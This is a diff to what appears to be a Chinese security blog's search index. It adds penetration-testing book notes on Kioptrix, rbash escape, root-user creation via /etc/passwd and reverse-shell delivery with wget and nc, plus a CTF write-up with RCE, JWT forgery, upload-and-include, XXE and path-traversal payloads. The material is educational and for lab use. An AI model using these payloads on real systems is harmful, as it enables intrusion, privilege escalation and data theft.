@@ -4398,17 +4398,17 @@
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">10</span>.xxx.xxx.xxx/shell.sh</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="第二章：新手村：从Kioptrix开始"><a href="#第二章：新手村：从Kioptrix开始" class="headerlink" title="第二章：新手村：从Kioptrix开始"></a>第二章：新手村：从Kioptrix开始</h1><h2 id="Point-1"><a href="#Point-1" class="headerlink" title="Point 1"></a>Point 1</h2><p>对于开放开80和443端口的IP，要分别访问80和443端口</p>
+<h1 id="第二章：新手村：从Kioptrix开始"><a href="#第二章：新手村：从Kioptrix开始" class="headerlink" title="第二章：新手村：从Kioptrix开始"></a>第二章：新手村：从Kioptrix开始</h1><h2 id="Point-1（80-443）"><a href="#Point-1（80-443）" class="headerlink" title="Point 1（80/443）"></a>Point 1（80/443）</h2><p>对于开放开80和443端口的IP，要分别访问80和443端口</p>
 <figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">    小贴士:相信有不少人会误以为https服务所提供的站点内容与当前主机http服务所提供的</span><br><span class="line">相同。实际上，在很多情况下，它们所提供的站点内容并不一样，因此在进行渗透测试时应针对</span><br><span class="line">它们分别进行测试。类似地， 一个<span class="built_in">IP</span>下可以运行多个站点，通过<span class="built_in">IP</span>访问和通过域名访问获得的结</span><br><span class="line">果也可能不尽相同，所以应分别留意。</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Point-2"><a href="#Point-2" class="headerlink" title="Point 2"></a>Point 2</h2><p>过时的中间件、服务版本，可能会存在漏洞，可在Exploit Database进行检索</p>
-<h2 id="Point-3"><a href="#Point-3" class="headerlink" title="Point 3"></a>Point 3</h2><p>getshell之后可通过linux提权辅助工具LinEnum进行提权</p>
+<h2 id="Point-2（Exploit-Database）"><a href="#Point-2（Exploit-Database）" class="headerlink" title="Point 2（Exploit Database）"></a>Point 2（Exploit Database）</h2><p>过时的中间件、服务版本，可能会存在漏洞，可在Exploit Database进行检索</p>
+<h2 id="Point-3（LinEnum）"><a href="#Point-3（LinEnum）" class="headerlink" title="Point 3（LinEnum）"></a>Point 3（LinEnum）</h2><p>getshell之后可通过linux提权辅助工具LinEnum进行提权</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">LinEnum 是一个 Linux 主机本地信息自动提取的 shell 脚本，它有超过 <span class="number">65</span> 项安全检查功能，比如潜在的 SUID<span class="regexp">/GUID 文件、Sudo/</span>rhost 错误配置等。</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Point-5"><a href="#Point-5" class="headerlink" title="Point 5"></a>Point 5</h2><p>提权需要在目标主机本地系统中选择一个我们拥有写权限的目录，<strong>Linux 下常用的相关目录</strong><br><strong>有/tmp/目录以及/dev/shm/目录等</strong></p>
-<h2 id="Point-6"><a href="#Point-6" class="headerlink" title="Point 6"></a>Point 6</h2><p>rbash</p>
+<h2 id="Point-5（linux写权限）"><a href="#Point-5（linux写权限）" class="headerlink" title="Point 5（linux写权限）"></a>Point 5（linux写权限）</h2><p>提权需要在目标主机本地系统中选择一个我们拥有写权限的目录，<strong>Linux 下常用的相关目录</strong><br><strong>有/tmp/目录以及/dev/shm/目录等</strong></p>
+<h2 id="Point-6（rbash）"><a href="#Point-6（rbash）" class="headerlink" title="Point 6（rbash）"></a>Point 6（rbash）</h2><p>rbash</p>
 <figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">小贴士: rbash是一种功能受限的<span class="keyword">bash </span><span class="keyword">shell,即它可以执行的命令被人为限制了，只有特</span></span><br><span class="line"><span class="keyword">定几种，也就是说，rbash是一 </span>种白名单限制<span class="keyword">shell,使用rbash </span>登录的用户只允许使用管理员预</span><br><span class="line">先设定好的命令，可见rbash的权限很低。如果rbash中限定的命令种类设置存在疏忽，就可能</span><br><span class="line">导致恶意攻击者可以利用某些被错误允许执行的命令运行出一个不受限的<span class="keyword">bash </span><span class="keyword">shell,该操作被</span></span><br><span class="line"><span class="keyword">成为rbash逃逸</span></span><br></pre></td></tr></table></figure>
 <p>在rbash中输入“?” ，会获得当前shell允许执行的所有命令列表</p>
 <p><img src="https://img.npfs06.top/20230922161952.png"></p>
@@ -4424,25 +4424,25 @@
 <li> ruby可以使用<code>exec&quot;/bin/sh&quot;</code>命令实现逃逸。</li>
 </ul>
 <p>这里只罗列了常见的部分，若想获得更多信息，建议进一步学习如下资料。<br>《Linux Restricted Shell Bypass》：<a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf%E3%80%82">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf。</a></p>
-<h2 id="Point-7"><a href="#Point-7" class="headerlink" title="Point 7"></a>Point 7</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">小贴士: sudo是Linux系统下的管理指令，普通用户可以通过sudo命令以root权限执行管理员设定的几</span><br><span class="line">个或全部程序。设定不同，每个用户被允许使用sudo执行的命令种类和数量也不同。用户可以通过sudo -l命令查看当前用户被允许使用的程序列表。此外，有些用户在使用sudo -l命令的时候也需要提供当前用户的密码，这是因为管理员对用户的设置不同。如果需要密码，那么对于使用反弹<span class="keyword">shell</span><span class="bash">获得的用户身份而言，可能就无法直接查看和使用sudo命令了。</span></span><br></pre></td></tr></table></figure>
-<h2 id="Point-8"><a href="#Point-8" class="headerlink" title="Point 8"></a>Point 8</h2><p>拥有修改敏感文件的权限时（比如sudo ht），我们可以直接在<code>/etc/passwd</code>文件中新增用户，并且把密码直接写在/etc/passwd文件里。</p>
+<h2 id="Point-7-（sudo）"><a href="#Point-7-（sudo）" class="headerlink" title="Point 7 （sudo）"></a>Point 7 （sudo）</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">小贴士: sudo是Linux系统下的管理指令，普通用户可以通过sudo命令以root权限执行管理员设定的几</span><br><span class="line">个或全部程序。设定不同，每个用户被允许使用sudo执行的命令种类和数量也不同。用户可以通过sudo -l命令查看当前用户被允许使用的程序列表。此外，有些用户在使用sudo -l命令的时候也需要提供当前用户的密码，这是因为管理员对用户的设置不同。如果需要密码，那么对于使用反弹<span class="keyword">shell</span><span class="bash">获得的用户身份而言，可能就无法直接查看和使用sudo命令了。</span></span><br></pre></td></tr></table></figure>
+<h2 id="Point-8-改用户提权"><a href="#Point-8-改用户提权" class="headerlink" title="Point 8 (改用户提权)"></a>Point 8 (改用户提权)</h2><p>拥有修改敏感文件的权限时（比如sudo ht），我们可以直接在<code>/etc/passwd</code>文件中新增用户，并且把密码直接写在/etc/passwd文件里。</p>
 <p>例如：<br><img src="https://img.npfs06.top/20230922155015.png"></p>
 <p>上述内容将创建一个用户名为rootwe,密码为toor的root用户。文中密码toor的密文sXuCKi7k3Xh/s是通过如下命令获得的:</p>
 <figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl passwd -crypt toor</span></span><br></pre></td></tr></table></figure>
 <p>也可以编辑<code>/etc/shadow</code>文件，将root账号的密码清空，保存退出后，然后执行su root命令即可无须密码切换到root用户</p>
 <p><img src="https://img.npfs06.top/20230922160336.png"></p>
 <p>也可以编辑<code>/etc/sudoers</code>文件，该文件包含了每个用户可以在不输入密码的情况下使用sudo命令的范围，即执行sudo -l命令时获得的输出结果。可以直接修改该文件给当前的低权限用户添加无须使用密码执行sudo /bash命令的权限。</p>
-<h2 id="Point-9"><a href="#Point-9" class="headerlink" title="Point 9"></a>Point 9</h2><p>跑sqlmap的时候可以设置下<code>--level</code>或者<code>--risk</code></p>
-<h2 id="Point-10"><a href="#Point-10" class="headerlink" title="Point 10"></a>Point 10</h2><p>有的时候会遇到这样一个问题，使用<code>python -m SimpleHTTPServer 80</code>命令开启http服务，但是目标主机系统中的wget命令将无法连接成功。这是因为该主机设置了策略，禁止连接远程主机的80端口，这时会出现如下图所示的连接等待界面。</p>
+<h2 id="Point-9（sqlmap）"><a href="#Point-9（sqlmap）" class="headerlink" title="Point 9（sqlmap）"></a>Point 9（sqlmap）</h2><p>跑sqlmap的时候可以设置下<code>--level</code>或者<code>--risk</code></p>
+<h2 id="Point-10-httpserver"><a href="#Point-10-httpserver" class="headerlink" title="Point 10 (httpserver)"></a>Point 10 (httpserver)</h2><p>有的时候会遇到这样一个问题，使用<code>python -m SimpleHTTPServer 80</code>命令开启http服务，但是目标主机系统中的wget命令将无法连接成功。这是因为该主机设置了策略，禁止连接远程主机的80端口，这时会出现如下图所示的连接等待界面。</p>
 <p><img src="https://img.npfs06.top/20230922164722.png"></p>
 <p>而如果在Kali系统中换一个端口开启SimpleHTTPServer，则可以成功绕过上述连接限制。本例中使用如下命令将SimpleHTTPServer改在8882端口开放。</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python</span> -m SinpleHTTPServer <span class="number">8882</span></span><br></pre></td></tr></table></figure>
 <p>之后在目标主机系统上使用wget命令访问Kali系统的8882端口下载文件，就不会再受连接限制影响了</p>
 <p><img src="https://img.npfs06.top/20230922164817.png"></p>
-<h2 id="Point-11"><a href="#Point-11" class="headerlink" title="Point 11"></a>Point 11</h2><p>Apache官方提供了一个名为DistrosDefaultLayout的站点，链接如下：</p>
+<h2 id="Point-11-Apache的默认安装路径"><a href="#Point-11-Apache的默认安装路径" class="headerlink" title="Point 11 (Apache的默认安装路径)"></a>Point 11 (Apache的默认安装路径)</h2><p>Apache官方提供了一个名为DistrosDefaultLayout的站点，链接如下：</p>
 <p><a href="https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout%E3%80%82">https://cwiki.apache.org/confluence/display/HTTPD/DistrosDefaultLayout。</a><br>上述站点提供了Linux各版本系统下Apache的默认安装路径</p>
 <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">当<span class="keyword">nmap</span>扫描出来的某端口无法访问时，如果条件允许，可以通过Apache中间件的主配置文件httpd.<span class="keyword">conf</span>来查找原因。比如存在目录穿越漏洞时，可通过上诉网站查找路径后配合漏洞进行读取</span><br></pre></td></tr></table></figure>
-<h2 id="Point-12"><a href="#Point-12" class="headerlink" title="Point 12"></a>Point 12</h2><p>Kali系统自带shell文件php_reverse_shell.php，它默认位于<code>/usr/share/webshells/php</code>目录。使用该文件时，首先要将其内部的反弹IP和端口更改为目前Kali系统实际使用的IP以及准备监听反弹shell的端口。</p>
+<h2 id="Point-12-（nc传输文件）"><a href="#Point-12-（nc传输文件）" class="headerlink" title="Point 12 （nc传输文件）"></a>Point 12 （nc传输文件）</h2><p>Kali系统自带shell文件php_reverse_shell.php，它默认位于<code>/usr/share/webshells/php</code>目录。使用该文件时，首先要将其内部的反弹IP和端口更改为目前Kali系统实际使用的IP以及准备监听反弹shell的端口。</p>
 <p><strong>使用nc传输文件</strong></p>
 <p>攻击机：192.168.192.134<br>目标机器：192.168.192.135</p>
 <p>当目标机器存在远程命令执行漏洞，但发现该目标主机系统限制使用nc的-e命令参数，这导致远程连接无法交互，输入任何命令都会直接断开连接。此外，由于目标主机本地没有bash、Python等程序，因此也导致相关反弹shell方法均不可用。这时使用文件写入方法，利用echo命令写入“一句Webshell”，获得一个可以回显的远程命令执行方式。</p>
@@ -4453,6 +4453,8 @@
 <p><img src="https://img.npfs06.top/20230922172510.png"></p>
 <p>该命令将通过nc监听8888端口。当该端口被访问时，nc会将本地php_reverse_shell.php的文件内容提供给对方。通过在Kali系统以及目标主机分别完成上述操作，就可以成功使用nc实现文件传输，最终的传输结果将保存在目标主机Web目录的reverse_shell.php中。<br>完成上述操作后，使用nc命令重新监听8888端口。</p>
 <p>最后通过浏览器访问链接<code>http://192.168.192.135:8080/xxxxx/reverse_shell.php</code>即可触发反弹shell的执行。</p>
+<h1 id="第三章-过时即风险：综合技能的扩展与提升"><a href="#第三章-过时即风险：综合技能的扩展与提升" class="headerlink" title="第三章 过时即风险：综合技能的扩展与提升"></a>第三章 过时即风险：综合技能的扩展与提升</h1><h2 id="Point-1-windows传文件"><a href="#Point-1-windows传文件" class="headerlink" title="Point 1 (windows传文件)"></a>Point 1 (windows传文件)</h2><p>在Linux系统下可以使用的wget、curl等命令在Windows系统下往往都是失效的，因而需要另辟蹊径，比较常用的方法包括<strong>smb文件共享</strong>以及<strong>使用powershell中的DownloadFile()函数</strong>，这里以后者为例进行讲解，smb文件共享方式在后续的实践将单独说明。<br>利用powershell的DownloadFile()函数下载文件到本地Windows主机的命令格式如下。</p>
+<p><img src="https://img.npfs06.top/20230925143953.png"></p>
 ]]></content>
       <categories>
         <category>读书笔记</category>
@@ -4528,6 +4530,8 @@
     <title>创造tips的秘籍--PHP回调后门</title>
     <url>/2020/10/18/%E5%88%9B%E9%80%A0tips%E7%9A%84%E7%A7%98%E7%B1%8D-PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/</url>
     <content><![CDATA[<p>转载自<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
+<a id="more"></a>
+
 <p>最近很多人分享一些过狗过盾的一句话，但无非是用各种方法去构造一些动态函数，比如<code>$_GET[&#39;func&#39;]($_REQUEST[&#39;pass&#39;])</code>之类的方法。万变不离其宗，但这种方法，虽然狗盾可能看不出来，但人肉眼其实很容易发现这类后门的。</p>
 <p>那么，我就分享一下，一些不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。</p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有很多朋友喜欢收藏一些tips，包括我也收藏了好多tips，有时候在渗透和漏洞挖掘过程中很有用处。</p>
@@ -14674,6 +14678,59 @@ payload:
 ]]></content>
       <categories>
         <category>problems</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>某省税务比赛题目CTF</title>
+    <url>/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/</url>
+    <content><![CDATA[<p>某省税务比赛题目CTF</p>
+<a id="more"></a>
+
+<h2 id="web832"><a href="#web832" class="headerlink" title="web832"></a>web832</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络安全为人民</span><br></pre></td></tr></table></figure>
+<h2 id="web833"><a href="#web833" class="headerlink" title="web833"></a>web833</h2><p>根据提示，让问url/robots.txt，然后下载check.php.bak</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$index</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$index</span>;</span><br><span class="line">    <span class="variable">$filter</span>=[<span class="string">&quot;strip_tags&quot;</span>,<span class="string">&quot;addslashes&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$index</span>?<span class="variable">$filter</span>[<span class="number">1</span>]:<span class="variable">$filter</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHandle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span>=getFilter();</span><br><span class="line">    <span class="variable">$say</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$array</span></span>) <span class="title">use</span> (<span class="params">&amp;<span class="variable">$filter</span></span>)</span>&#123;</span><br><span class="line">        extract(<span class="variable">$array</span>);</span><br><span class="line">        <span class="variable">$hello</span>=<span class="variable">$filter</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$hello</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span>=getHandle();</span><br><span class="line"><span class="variable">$message</span>=<span class="string">&quot;hello &quot;</span>.<span class="variable">$msg</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码匿名函数那部分有点难懂，借用gpt的解释</p>
+<p><img src="https://img.npfs06.top/20231123103417.png"></p>
+<p>对于匿名函数中的$array变量来源可以这么理解</p>
+<p><img src="https://img.npfs06.top/20231123103528.png"></p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">url/<span class="keyword">check</span>.php?<span class="keyword">filter</span>=<span class="keyword">system</span>，然后POST传入<span class="type">name</span>=cat /flag_is_here</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="web834"><a href="#web834" class="headerlink" title="web834"></a>web834</h2><p>仔细审题  秘钥111111</p>
+<p><img src="https://img.npfs06.top/20231123104330.png"></p>
+<p>任意用户注册，修改密码，抓包，注意到cookie有个username，像jwt格式</p>
+<p><img src="https://img.npfs06.top/20231123104146.png"></p>
+<p>改成admin  , 秘钥111111</p>
+<p><img src="https://img.npfs06.top/20231123104445.png"></p>
+<p>替换原cookie， 成功修改admin密码</p>
+<h2 id="web835"><a href="#web835" class="headerlink" title="web835"></a>web835</h2><ol>
+<li>根据题目提示，输入admin 123456登陆</li>
+<li>根据提示，文件是hbsw7.zip</li>
+<li>打开源码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">        doUpload();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;include&quot;</span>:</span><br><span class="line">        doInclude();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="string">&quot;nothing here&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doInclude</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/log|php|tmp/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error filenname&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doUpload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span>=file_get_contents(<span class="variable">$tmp_name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(filter_filename(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(filter_content(<span class="variable">$content</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    move_uploaded_file(<span class="variable">$tmp_name</span>,<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传成功,文件路径为  /var/www/html/upload/&quot;</span>.<span class="variable">$file</span>];</span><br><span class="line">    <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_filename</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ban_ext</span>=<span class="keyword">array</span>(<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = end(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">return</span> !in_array(<span class="variable">$file_ext</span>,<span class="variable">$ban_ext</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_content</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&quot;/php|include|require|get|post|request/i&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>api.php对action进行传参，即url/api.php?action=，upload是上传文件，include是包含文件</p>
+<p>可以查看源码:只能上传jpeg和png图片，并且会对内容进行检查，内容不能含有php|include|require|get|post|request</p>
+<ol start="4">
+<li>先上传一个png图片，里面嵌入php代码，然后进行上传</li>
+</ol>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&quot;cat ./F*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后对上传的文件进行包含吗，即可得到flag</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">GET：url/api.php?action=<span class="keyword">include</span></span><br><span class="line">POST: filename=<span class="regexp">/var/</span>www<span class="regexp">/html/u</span>pload/a.png</span><br></pre></td></tr></table></figure>
+
+
+<p>注：include 会执行包含的任意格式文件里的php代码</p>
+<h2 id="web836"><a href="#web836" class="headerlink" title="web836"></a>web836</h2><p>二次报错注入</p>
+<p><img src="https://img.npfs06.top/20231123140401.png"></p>
+<h2 id="web837"><a href="#web837" class="headerlink" title="web837"></a>web837</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mytest</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">config</span> <span class="attr">name</span>=<span class="string">&quot;shutdown&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>/usr/local/bin<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execute</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">execute</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">args</span>&gt;</span>-clear<span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configs</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="web838"><a href="#web838" class="headerlink" title="web838"></a>web838</h2><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/file/</span>download?<span class="keyword">file</span>=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>../flag</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web入门</category>
       </categories>
   </entry>
 </search>
